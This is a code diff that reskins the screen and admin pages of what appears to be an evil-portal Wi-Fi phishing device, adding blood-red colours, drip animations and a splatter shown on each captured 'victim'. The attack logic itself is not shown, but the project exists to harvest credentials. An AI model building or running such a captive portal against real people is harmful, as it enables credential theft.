@@ -56,30 +56,35 @@ const unsigned long BLINK_INTERVAL = 150;  // ms between toggles
 
 // LCD theme (RGB565) + live status-dot state
 #define RGB565(r, g, b) ((uint16_t)(((r & 0xF8) << 8) | ((g & 0xFC) << 3) | ((b) >> 3)))
-#define C_BG      RGB565(15, 17, 21)     // background
-#define C_ACCENT  RGB565(24, 119, 242)   // header bar (blue)
-#define C_ACCENT2 RGB565(120, 170, 255)  // gateway value (light blue)
-#define C_OK      RGB565(48, 163, 108)   // "active" dot
-#define C_OKDIM   RGB565(22, 60, 42)     // "active" dot, off phase
-#define C_MUTED   RGB565(138, 147, 166)  // labels
-#define C_CARD    RGB565(26, 29, 36)     // counter card
-#define C_COUNT   RGB565(255, 196, 0)    // victim count (amber)
+// ---- Horror "blood" theme (device screens only; victim web pages stay blue) ----
+#define C_BG      RGB565(14, 6, 7)        // background (near-black, warm)
+#define C_ACCENT  RGB565(140, 16, 18)     // header bar (blood red)
+#define C_ACCENT2 RGB565(210, 48, 44)     // bright blood accent
+#define C_OK      RGB565(70, 165, 92)     // "active" dot (sickly green)
+#define C_OKDIM   RGB565(26, 58, 36)     // "active" dot, off phase
+#define C_MUTED   RGB565(156, 128, 128)  // labels (ashen grey)
+#define C_CARD    RGB565(30, 15, 17)      // row / counter card (dark blood-grey)
+#define C_COUNT   RGB565(255, 74, 58)     // victim count (blood red)
 #define C_DANGER  RGB565(229, 72, 77)    // low-battery fill (red)
-#define C_BONE    RGB565(226, 230, 238)  // skull bone, mid tone
+#define C_BONE    RGB565(226, 222, 220)  // skull bone, mid tone
 #define C_BONE_HI RGB565(255, 255, 255)  // skull bone, highlight
-#define C_BONE_SH RGB565(150, 158, 174)  // skull bone, shadow
-#define C_BONE_SH2 RGB565(96, 103, 118)  // skull bone, deep shadow / outline
-#define C_SOCKET  RGB565(10, 11, 16)     // eye sockets / nasal cavity (near black)
-#define C_EYE     RGB565(255, 40, 40)    // skull eyes, bright glow
-#define C_EYEDIM  RGB565(120, 16, 16)    // skull eyes, dim glow
-// Depth / menu shading palette
-#define C_BG2      RGB565(8, 9, 13)       // background gradient (bottom, darker)
-#define C_HDR_TOP  RGB565(56, 139, 255)   // header gradient top (brighter blue)
-#define C_HDR_BOT  RGB565(18, 74, 170)    // header gradient bottom (deep blue)
-#define C_CARD_HI  RGB565(46, 51, 63)     // row bevel highlight (top edge)
-#define C_CARD_SH  RGB565(6, 7, 10)       // drop shadow under cards / header
-#define C_ACC_DK   RGB565(18, 72, 160)    // selected row, bottom of accent
-#define C_ACC_HI   RGB565(120, 170, 255)  // selected row bevel / glow
+#define C_BONE_SH RGB565(158, 150, 150)  // skull bone, shadow
+#define C_BONE_SH2 RGB565(104, 96, 98)   // skull bone, deep shadow / outline
+#define C_SOCKET  RGB565(8, 3, 4)        // eye sockets / nasal cavity (near black)
+#define C_EYE     RGB565(255, 36, 32)    // skull eyes, bright glow
+#define C_EYEDIM  RGB565(120, 14, 12)    // skull eyes, dim glow
+// Depth / menu shading palette (blood)
+#define C_BG2      RGB565(4, 1, 2)        // background gradient (bottom, darker)
+#define C_HDR_TOP  RGB565(168, 24, 26)    // header gradient top (fresh blood)
+#define C_HDR_BOT  RGB565(68, 8, 10)      // header gradient bottom (dried blood)
+#define C_CARD_HI  RGB565(66, 30, 32)     // row bevel highlight (top edge)
+#define C_CARD_SH  RGB565(3, 1, 2)        // drop shadow under cards / header
+#define C_ACC_DK   RGB565(70, 8, 10)      // selected row, bottom of accent
+#define C_ACC_HI   RGB565(224, 58, 54)    // selected row bevel / glow
+// Blood drip colors
+#define C_BLOOD    RGB565(150, 10, 12)    // blood body
+#define C_BLOOD_DK RGB565(72, 4, 6)       // blood shadow / dried
+#define C_BLOOD_HI RGB565(224, 48, 46)    // wet highlight / glint
 bool dotOn = false;
 
 // -------- App menu / state machine --------
@@ -398,18 +403,19 @@ String header(String t) {
 // stat tiles, a table of captures (newest first), and action buttons.
 String creds() {
   String css =
-    ":root{--bg:#0f1115;--card:#171a21;--line:#262b36;--txt:#e6e9ef;--mut:#8a93a6;--accent:#4169e1;--danger:#e5484d}"
+    ":root{--bg:#0d0708;--card:#1a1012;--line:#3a1c1e;--txt:#e9e2e2;--mut:#b09a9a;--accent:#c01818;--danger:#e5484d}"
     "*{box-sizing:border-box}"
     "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
-    ".top{background:linear-gradient(90deg,#1b2a6b,#4169e1);padding:18px 20px}"
+    ".top{background:linear-gradient(90deg,#3a0607,#b11212);padding:18px 20px;position:relative;border-bottom:3px solid #6e0a0a}"
+    ".top::after{content:'';position:absolute;left:0;right:0;top:100%;height:16px;z-index:5;background:radial-gradient(10px 15px at 14px 0,#9e0f0f 58%,transparent 60%) repeat-x;background-size:46px 16px}"
     ".top h1{margin:0;font-size:20px;letter-spacing:.3px}"
-    ".top p{margin:3px 0 0;color:#cdd6ff;font-size:13px}"
+    ".top p{margin:3px 0 0;color:#f0c9c9;font-size:13px}"
     ".wrap{max-width:900px;margin:0 auto;padding:16px}"
     ".stats{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}"
     ".tile{flex:1;min-width:140px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px}"
     ".tile .k{color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px}"
     ".tile .v{font-size:26px;font-weight:700;margin-top:4px}"
-    ".tile .v.accent{color:#8ab0ff}"
+    ".tile .v.accent{color:#ff8a8a}"
     ".bar{display:flex;gap:10px;flex-wrap:wrap;margin:8px 0 16px}"
     ".btn{display:inline-block;padding:9px 14px;border-radius:10px;border:1px solid var(--line);background:var(--card);color:var(--txt);text-decoration:none;font-size:14px;cursor:pointer}"
     ".btn:hover{border-color:var(--accent)}"
@@ -504,15 +510,16 @@ String creds() {
 // `saved` highlights that a POST just applied.
 String settingsPage(bool saved) {
   String css =
-    ":root{--bg:#0f1115;--card:#171a21;--line:#262b36;--txt:#e6e9ef;--mut:#8a93a6;--accent:#4169e1;--ok:#30a36c}"
+    ":root{--bg:#0d0708;--card:#1a1012;--line:#3a1c1e;--txt:#e9e2e2;--mut:#b09a9a;--accent:#c01818;--ok:#30a36c}"
     "*{box-sizing:border-box}"
     "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
-    ".top{background:linear-gradient(90deg,#1b2a6b,#4169e1);padding:18px 20px}"
-    ".top h1{margin:0;font-size:20px}.top p{margin:3px 0 0;color:#cdd6ff;font-size:13px}"
+    ".top{background:linear-gradient(90deg,#3a0607,#b11212);padding:18px 20px;position:relative;border-bottom:3px solid #6e0a0a}"
+    ".top::after{content:'';position:absolute;left:0;right:0;top:100%;height:16px;z-index:5;background:radial-gradient(10px 15px at 14px 0,#9e0f0f 58%,transparent 60%) repeat-x;background-size:46px 16px}"
+    ".top h1{margin:0;font-size:20px}.top p{margin:3px 0 0;color:#f0c9c9;font-size:13px}"
     ".wrap{max-width:680px;margin:0 auto;padding:16px}"
     ".card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;margin:0 0 16px}"
     ".sec{display:flex;align-items:center;gap:8px;font-size:12px;text-transform:uppercase;letter-spacing:.6px;"
-    "color:#8ab0ff;font-weight:700;margin:0 0 14px;padding:0 0 10px;border-bottom:1px solid var(--line)}"
+    "color:#ff8a8a;font-weight:700;margin:0 0 14px;padding:0 0 10px;border-bottom:1px solid var(--line)}"
     ".row{margin:0 0 14px}.row:last-child{margin-bottom:0}"
     "label{display:block;color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px;margin:0 0 6px}"
     "input[type=text],input[type=password],input[type=number],select{width:100%;padding:10px 12px;border-radius:10px;"
@@ -521,7 +528,7 @@ String settingsPage(bool saved) {
     ".chk input{width:18px;height:18px;flex:none}"
     ".chk .sub{display:block;color:var(--mut);font-size:12px;text-transform:none;letter-spacing:0}"
     ".range{display:flex;align-items:center;gap:12px}.range input[type=range]{flex:1;accent-color:var(--accent)}"
-    ".vv{min-width:46px;text-align:right;color:#8ab0ff;font-weight:700}"
+    ".vv{min-width:46px;text-align:right;color:#ff8a8a;font-weight:700}"
     ".btn{display:inline-block;padding:10px 16px;border-radius:10px;border:1px solid var(--line);background:var(--card);"
     "color:var(--txt);text-decoration:none;font-size:15px;cursor:pointer}"
     ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
@@ -948,6 +955,62 @@ void playLaugh() {
   else M5.Speaker.tone(4000, 60);
 }
 
+// -------- Horror / blood visuals --------
+
+// A single blood drip hanging from (x, top) running down `len` px: a wet column
+// with a rounded bead at the tip, shaded left (dark) and right (glint).
+void drawBloodDrip(int x, int top, int len) {
+  if (len < 1) return;
+  M5.Lcd.fillRect(x - 1, top, 3, len, C_BLOOD);          // column
+  M5.Lcd.drawFastVLine(x - 2, top, len, C_BLOOD_DK);     // left shadow
+  M5.Lcd.drawFastVLine(x + 1, top, len, C_BLOOD_HI);     // wet right edge
+  M5.Lcd.fillCircle(x, top + len, 2, C_BLOOD);           // bead at the tip
+  M5.Lcd.drawPixel(x - 1, top + len - 1, C_BLOOD_HI);    // glint
+}
+
+// Blood oozing from the header line and running down the screen's side margins.
+// The drips stay in the left/right margins so they never cover menu content.
+void drawBloodFrame() {
+  M5.Lcd.drawFastHLine(0, 26, 240, C_BLOOD_DK);
+  M5.Lcd.drawFastHLine(0, 27, 240, C_BLOOD);
+  drawBloodDrip(2,   28, 66);
+  drawBloodDrip(5,   28, 30);
+  drawBloodDrip(234, 28, 42);
+  drawBloodDrip(237, 28, 88);
+}
+
+// Quick blood-splatter flash over the screen (used when a victim is captured).
+void bloodSplat() {
+  for (int i = 0; i < 16; i++) {
+    int x = random(12, 228), y = random(32, 118), r = random(2, 8);
+    M5.Lcd.fillCircle(x, y, r, C_BLOOD);
+    M5.Lcd.fillCircle(x + random(-3, 4), y + random(-3, 4), (r > 3 ? r / 2 : 1), C_BLOOD_HI);
+    if (r > 5) M5.Lcd.fillRect(x - 1, y, 2, random(5, 16), C_BLOOD);  // a short run
+  }
+  delay(120);
+}
+
+// Boot finale: blood pours from the top of the screen and pools at the bottom.
+// Draw-only (append), so it layers over the final skull frame without flicker.
+void bloodWash(int durMs) {
+  const int N = 15;
+  int xs[N], target[N];
+  for (int i = 0; i < N; i++) { xs[i] = 6 + i * (228 / (N - 1)); target[i] = 45 + (int)random(0, 85); }
+  unsigned long start = millis();
+  while (millis() - start < (unsigned long)durMs) {
+    float t = (millis() - start) / (float)durMs;
+    for (int i = 0; i < N; i++) {
+      float st = (i % 3) * 0.10f;
+      float p = (t - st) / (1.0f - st);
+      if (p < 0) p = 0; if (p > 1) p = 1;
+      drawBloodDrip(xs[i], 0, (int)(p * target[i]));
+    }
+    int pool = (int)(t * 26);
+    if (pool > 0) fillVGrad(0, 135 - pool, 240, pool, C_BLOOD_DK, C_BLOOD);
+    delay(28);
+  }
+}
+
 // Boot splash: a smooth vector skull that laughs (jaw drops open/shut, pulsing
 // red eyes, slight head bob) with a "HA HA HA!" burst and a progress bar, now
 // synced to a real synthesized cackle on the speaker. Runs ~5 seconds.
@@ -989,6 +1052,14 @@ void bootScreen() {
     M5.Lcd.fillRect(0, 0, 240, 110, C_BG);
     drawSkull(cx, cyBase + bob, open, open ? C_EYE : C_EYEDIM);
 
+    // Blood weeping from the eye sockets, growing as the animation runs.
+    int tearLen = (int)(el / 150);
+    if (tearLen > 2) {
+      int ey = cyBase + bob + 2;
+      drawBloodDrip(cx - 18, ey + 6, min(tearLen, 46));
+      drawBloodDrip(cx + 18, ey + 6, min(tearLen, 46));
+    }
+
     // "HA HA HA!" burst on the open-jaw frames.
     if (open) {
       M5.Lcd.setTextDatum(MC_DATUM);
@@ -1015,17 +1086,21 @@ void bootScreen() {
   // Ensure the bar reads full before leaving.
   M5.Lcd.fillRoundRect(bx + 3, by + 3, bw - 6, bh - 6, 2, C_ACCENT);
   delay(150);
+
+  // Horror finale: blood pours down the screen and pools at the bottom.
+  bloodWash(1400);
+  delay(250);
 }
 
 // Full dashboard repaint: header, SSID, gateway, and the victim-count card.
 void drawMainScreen() {
   M5.Lcd.fillScreen(C_BG);
 
-  // Header bar
-  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
+  // Header bar (blood gradient)
+  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
   M5.Lcd.setTextDatum(MC_DATUM);
   M5.Lcd.setTextSize(2);
-  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
+  M5.Lcd.setTextColor(TFT_WHITE);
   M5.Lcd.drawString("PORTAL EVIL HUEBR", 112, 13);
   drawStatusDot(true);
 
@@ -1060,6 +1135,8 @@ void drawMainScreen() {
   M5.Lcd.setTextSize(4);
   M5.Lcd.setTextColor(C_COUNT, C_CARD);
   M5.Lcd.drawString(String(capcount), 226, 111);
+
+  drawBloodFrame();   // blood running down the screen
 }
 
 void applyBrightness() {
@@ -1235,7 +1312,7 @@ void fillBgBand(int y, int h) {
 // Live status line under the header on the main menu: portal state, captures
 // and connected clients. Redrawn on its own each tick so it stays current.
 void drawStatusStrip() {
-  fillBgBand(28, 14);
+  M5.Lcd.fillRect(8, 28, 224, 14, C_BG);   // clear inner area only (keep margin blood)
   int clients = portalStarted ? WiFi.softAPgetStationNum() : 0;
   M5.Lcd.fillCircle(12, 35, 3, portalStarted ? C_OK : C_DANGER);
   M5.Lcd.setTextDatum(ML_DATUM);
@@ -1393,6 +1470,7 @@ void drawMenu(bool animate) {
   else for (int i = 0; i < n; i++) drawMenuRow(i, i == menuSel, 0);
 
   drawMenuFooter(n);
+  drawBloodFrame();   // blood running down the side margins
 }
 
 // Move the highlight to a new row: repaint just the two affected rows (snappy)
@@ -1435,6 +1513,8 @@ void showDeviceInfo() {
   M5.Lcd.setTextDatum(BC_DATUM);
   M5.Lcd.setTextColor(C_MUTED, C_BG);
   M5.Lcd.drawString("Press any button to go back", 120, 134);
+
+  drawBloodFrame();
 
   while (true) {
     M5.update();
@@ -1571,6 +1651,7 @@ void loop() {
       lastTick = millis();
       if (capcount != previous) {
         previous = capcount;
+        bloodSplat();       // horror splatter flash on a fresh capture
         drawMainScreen();   // full repaint with the new count
         dotOn = true;
       } else {
